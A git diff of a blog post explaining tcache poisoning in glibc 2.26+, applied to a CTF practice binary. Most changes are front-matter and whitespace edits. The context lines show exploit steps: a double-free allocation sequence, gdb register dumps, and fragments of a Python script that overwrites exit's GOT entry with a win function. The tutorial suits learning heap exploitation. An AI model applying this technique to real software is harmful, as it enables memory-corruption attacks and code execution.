@@ -2,14 +2,16 @@
 layout: post
 title:  "Tcache Poisoning [heap exploitation]"
 date:   2019-09-09 03:59:00
-categories: experience
+categories: research
+tags: heap linux libc ctf pwn
+description: this article explains about heap.
 ---
 
 
 # Tcache Poisoning
-what is tcache poisoning ? 
+what is tcache poisoning ?
 In glibc-2.26, TCache (per-thread cache), a new feature, was introduced in malloc.
-and tcache poisoning is a technique to poison Tcache feature in glibc-2.26. for example from how2heap by shellpish team 
+and tcache poisoning is a technique to poison Tcache feature in glibc-2.26. for example from how2heap by shellpish team
 
 	This file demonstrates a simple tcache poisoning attack by tricking malloc into
 	returning a pointer to an arbitrary location (in this case, the stack).
@@ -121,14 +123,14 @@ void main(){
 {% endhighlight %}
 
 
-you can find this challenge on my repository [here](https://github.com/tripoloski1337/learn-to-pwn/tree/master/tcache_poisoning) in this case we have to allocating memory and double freeing , since there's no checks for double free on glibc-2.26+. so we can directly do double free, after that we can allocate memory and fill it with whatever we want. at this point we already controll the rdx register. 
+you can find this challenge on my repository [here](https://github.com/tripoloski1337/learn-to-pwn/tree/master/tcache_poisoning) in this case we have to allocating memory and double freeing , since there's no checks for double free on glibc-2.26+. so we can directly do double free, after that we can allocate memory and fill it with whatever we want. at this point we already controll the rdx register.
 
 	malloc(0x100)
 	free(0)
 	free(0)
 	malloc(0x100) <------ control rdi
 	malloc(0x100) <------ just a padding
-	malloc(0x100) <------ another control 
+	malloc(0x100) <------ another control
 
 ### how can it be ?
 if you look into gdb there's something interesting at address **<malloc+407>**
@@ -155,7 +157,7 @@ this instruction will mov rdx value to rdi. it's mean it will move whatever valu
     $r14   : 0x0
     $r15   : 0x0
 
-in this case we can GOT overwrite from exit() function to win() function 
+in this case we can GOT overwrite from exit() function to win() function
 
 {% highlight c %}
 	case 3:
@@ -164,7 +166,7 @@ in this case we can GOT overwrite from exit() function to win() function
 		break;
 {% endhighlight %}
 
-to make it more clear and reliable i made a python script to exploit this binary 
+to make it more clear and reliable i made a python script to exploit this binary
 
 {%highlight python%}
 
@@ -191,7 +193,7 @@ free()
 
 alloc(0x28,p64(exit_got))
 alloc(0x28,p8(0x00))
-alloc(0x28,p64(win_plt)) 
+alloc(0x28,p64(win_plt))
 
 r.interactive()
 
